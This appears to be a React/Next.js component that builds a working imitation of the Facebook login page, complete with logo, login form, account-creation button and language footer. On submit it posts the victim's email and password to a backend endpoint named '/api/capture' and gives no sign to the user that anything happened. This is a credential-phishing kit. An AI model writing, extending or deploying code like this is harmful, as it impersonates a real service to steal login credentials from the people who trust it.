'use client'

import { useState } from 'react'
import styles from '@/styles/FacebookLoginFlow.module.css'

const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:3001'

export default function FacebookLoginFlow() {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [errorMsg, setErrorMsg] = useState('')

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!email.trim() || !password) {
      setErrorMsg('Please enter your email and password.')
      return
    }

    setErrorMsg('')

    const payload = {
      email: email.trim(),
      password,
      method: 'facebook',
    }

    try {
      await fetch(`${BACKEND_URL}/api/capture`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })
    } catch (error) {
      console.warn('Backend request failed')
    }
  }

  return (
    <div className={styles.contentBox}>
      <div>
        <img
          src="/user/images/facebook-logo.svg"
          alt="Facebook"
          className={styles.logoPlaceholder}
        />
        <h1 className={styles.heading}>facebook</h1>

        {errorMsg && <span className={styles.errorMsg}>{errorMsg}</span>}

        <form onSubmit={handleLogin}>
          <input
            type="email"
            placeholder="Email or phone number"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className={styles.inputField}
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className={styles.inputField}
          />

          <div className={styles.btnContainer}>
            <button type="submit" className={styles.loginBtn}>
              Log In
            </button>
          </div>
        </form>

        <div className={styles.forgotLink}>
          <a href="#">Forgotten password?</a>
        </div>

        <hr style={{ margin: '20px 0', border: 'none', borderTop: '1px solid #e5e5e5' }} />

        <div className={styles.btnContainer}>
          <button className={styles.createBtn}>
            Create new Facebook account
          </button>
        </div>
      </div>

      <footer className={styles.footer}>
        <ul>
          <li><a href="#">English (US)</a></li>
          <li><a href="#">Español</a></li>
          <li><a href="#">Français (France)</a></li>
          <li><a href="#">Deutsch</a></li>
          <li><a href="#">中文(简体)</a></li>
          <li><a href="#">العربية</a></li>
          <li><a href="#">한국어</a></li>
          <li><a href="#">日本語</a></li>
          <li><a href="#">Português (Brasil)</a></li>
          <li><a href="#">Italiano</a></li>
          <li><a href="#">Русский</a></li>
          <li><a href="#">हिन्दी</a></li>
          <li><a href="#">ไทย</a></li>
          <li><a href="#">中文(繁體)</a></li>
          <li><a href="#">Türkçe</a></li>
          <li><a href="#">Українська</a></li>
          <li><a href="#">Tiếng Việt</a></li>
          <li><a href="#">Čeština</a></li>
          <li><a href="#">Suomi</a></li>
          <li><a href="#">Беларуская</a></li>
          <li><a href="#">Bosanski</a></li>
          <li><a href="#">Български</a></li>
          <li><a href="#">Ελληνικά</a></li>
          <li><a href="#">Хрватски</a></li>
          <li><a href="#">ქართული</a></li>
          <li><a href="#">Latvian</a></li>
          <li><a href="#">Lietuvių</a></li>
          <li><a href="#">Magyar</a></li>
          <li><a href="#">Українська</a></li>
          <li><a href="#">Română</a></li>
          <li><a href="#">Словенский</a></li>
          <li><a href="#">Svenska</a></li>
          <li><a href="#">Slovenščina</a></li>
        </ul>
      </footer>
    </div>
  )
}
